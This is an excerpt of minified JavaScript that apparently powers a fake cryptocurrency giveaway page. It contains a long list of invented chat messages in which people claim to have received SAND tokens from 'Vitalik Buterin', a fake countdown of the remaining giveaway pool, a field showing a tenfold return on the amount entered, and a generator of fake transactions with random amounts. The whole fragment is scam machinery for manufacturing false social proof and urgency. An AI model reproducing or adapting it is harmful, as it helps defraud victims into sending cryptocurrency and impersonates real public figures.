...
(() => {
    ...
    let c = ["Never seen anyrhing like that, but lucky it worked! Thanks.", "Got 7000 SAND THANK YOU VITALIK", "NEVER DOUBT VITAL", "HI!", "I GOT FUCKING 3700 OMG", "IM IN!!", "this is insane ", "VERY NICE GUYS", "Recieved 8600 SAND OMG VITALIK BUTERIN I LOVE YOU!", "awesome offer can I use it 1 more time? I shouldve sent more...", "GOT 1000", "wtf it worked", "May the God be with you.", "I was doubting for a long time if I should send here my 3400 SAND, but it actually worked for me so I got 1420 SAND now thanks to sandbox.", "OH SHIT IT WORKS!!!!!!!", "thanks for 2400 SAND. fine here!", "OH FUCK I GOT THE RETURM ! THANKS", "Gracias papi", "200 SAND", "crypto is a bubble...", "9000 SAND ON MY WALLET", "This is going to change my life!", "+5900", "HERE I AM, GOT $5k FUCKING INSANE THING!!!!!!", "VITALIK WE LOVE YOU!!!", "got 2100 on my wallet now :)", "You better be fast guys!", "Vitalik never dissapoints!!", "5774", "I sold all by SAND a day ago ;(", "GOTTA BUY A BRAND NEW CHEVY!! 18 thousand bucks", "+78K$. this is an actual nonsence", "GENEROUS PRESENT!", "I was lucky to get my $200.", "I CANT IMAGINE WHAT WILL HAPPEN WITH THE PRICE", "GOD BLESSF YOU !", "Hell yeah got my 2500 ! ", "wish i hsd more money to send... +100 of SAND", "ONE TIME OPPORTUNITY ", "7200 SAND", "OHHHH COME HERE $$$$$$", "Thank you Vitalik Buterin! From me and my son.", "1200 SAND !", "SAND INU TO 100k$", "BIG PUMP IS COMING", "Thank you for everything.", "WHAAAAAAT??", "1200 SAND", "got 9200 SAND, not too much but thank you!", "I recieved 15000 SAND as well. This is a fine investment.", "CRYPTOKING!", "THANKS FOR THE NEW CAR", "God Bless!", "983 ye", "OH YES!", "+1800", "SAND TO THE MOON", "WOW", "+38.4K!!!!", "does it doubles the amount you send?", "Ill take my chances", "can I have more?", "I AM HAPPY", "OH YESSS 11K", "THANKS!", "+9200 SAND", "HOW IS THIS POSSIBLE?", "Hello everyone!", "WHAT", "THIS IS THE BEST", "How much left??????", "it took a couple of minutes but I got $13,000 ", "Really?", "THE KING!", "SpaceX launch soon?", "+ 20K bucks", "omg this is real!", "+13K", "I LOVE YOU", "THATS GOOD!", "Got some!", "HEYYY", "MY GOD", "200 SAND? yeah", "how you doing guys? xD", "WOOOOOOOOW!!", "How can I contact bless?", "Unbeliveable charity!", "GOT 12200!!!!!!!!", "Thats greatful!", "Changed my mind on SAND. THANK YOU!", "1820", "SAND GOES 1mil$", "thanks much !!!!", "I want to participate again!!!!!!!!", "just recieved 3000 SAND", "Please give me some more!", "Very good.", "I CANT BELIEVE IT", "i actually got 2200 SAND back what the fuck?", "Tell your friends!", "+ 1100", 'THAT"S BEAUTIFUL!', "GOT $2k OMG", "Too good!", "SAND 4 LIFE", "I will remember this moment forever! Recieved 40,000", "Thank god Im on time", "THIS IS SICK!", "this is magic", "2000 SAND !!!", "Hi everyone :)", "HYPE!", "I love you!!", "I bless you SAND!!", "+ SAND 1800", "thanks for letting me participate!", 'Should"ve deposited more....', "Hello!", "thanks for 9000", "2000 SAND I CANT BELIVE MY EYES!!!!", "Im not gonna work again just trading :D", "OOOOMMMGG!!!!!!!!!!!!!!!!!", "Glad I figured all out! Now I got some money to invest.", "Thank god.", "LETS GO GUYS", "SAND $10k SOON", "+ 1200 SAND !", "Chill out", "I got 600 SAND", "GOOD LUCK EVERYONE! I gotr my cut already", "SO HAPPY!", "omg recieved 4000 backl!!!!!", "recieived some SAND thanks", "Who else if not blockstream could help us ", "Blockstream!!", "+ 1998 SAND!!!", "YEAH BITCH", "Im very thankful", "NEW SAND ATH COMING", "Perfect", "WE LOVE YOU", "HI", "I WISH I HAD MORE SAND TO SEND", "+6600", "Thats for real", "IT IS ACTUAL", "AWESOME", "1834", "SAND GOES 100k$", "SAND ROCKET"];
    ...
    T.prototype = {
        ...
        coins: "SAND,BNB,XRP,XLM,DOGE,ARDR"
    });
    const y = e => {
    ...
    let A = document.querySelector(".bnb__ost-value"),
        ...
        KHMX =document.querySelector(".khmx") ,
        KHMX2 =document.querySelector(".khmx2");
        
    // количество прoцентов
    const R = 200000;
    localStorage.setItem("procent", 162000), A.innerHTML = localStorage.getItem("procent").toLocaleString("en-EN");
    ...
    !function e() {
        setTimeout((function () {
            ...
            if (n < M && n > 0) {
                ...
                KHMX.innerHTML =  200000 - localStorage.getItem("procent");
                KHMX2.innerHTML =  200000 - localStorage.getItem("procent");
    ...
    N && F && N.addEventListener("input", (function () {
        parseFloat(N.value) ? F.value = 10 * parseFloat(N.value) : F.value = 0
    }));
    ...
    function D() {
        0;
        var e = '<div class="item" style="display:none"><div class="top"><div class="data"><div style="" class="data-item">{t1}</div><div style="display: none" class="data-item">{t2}</div><div class="data-item" id="SANDstr">{t4}</div><div class="data-item">{t5}</div><div class="data-item">{t6}</div><div class="data-item">{t3}</div><div class="data-item">{t7}</div><div style="display: none" class="data-item">{t8}</div></div></div><div class="bottom"><div class="data"><div style="" class="data-item">{b1}</div><div style="display: none" class="data-item">{b2}</div><div class="data-item">{b4}</div><div class="data-item">{b5}</div><div class="data-item" id="SANDstr">{b6}</div><div class="data-item">{b3}</div><div class="data-item">{b7}</div><div style="display:none"; class="data-item">{b8}</div></div></div></div>';
        let t = H(10),
            ...
            i = function (e, t) {
                let o;
                return o = Math.random() * (t - e) + e, o.toFixed(0)
            }(100, 10000),
            a = i + " SAND",
